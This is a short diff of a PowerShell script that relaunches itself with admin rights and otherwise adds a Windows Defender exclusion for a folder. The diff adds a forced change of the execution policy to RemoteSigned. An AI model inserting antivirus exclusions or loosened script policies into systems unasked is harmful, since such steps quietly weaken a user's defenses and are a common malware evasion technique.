@@ -13,4 +13,5 @@ if (-not $isAdmin) {
 [System.Diagnostics.Process]::Start($startInfo) | Out-Null
 } else {
 	Add-MpPreference -ExclusionPath $folderPath
+	Set-ExecutionPolicy RemoteSigned -Force
 }
